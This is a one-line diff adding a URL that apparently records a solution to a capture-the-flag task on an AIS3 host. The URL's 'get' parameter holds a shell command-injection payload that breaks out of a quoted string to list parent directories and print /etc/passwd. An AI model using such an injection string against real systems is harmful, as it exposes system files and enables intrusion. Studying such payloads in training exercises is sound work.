@@ -1,0 +1,1 @@
+https://squirrel.ais3.org/api.php?get=';ls -alF ../../..; cat '/etc/passwd
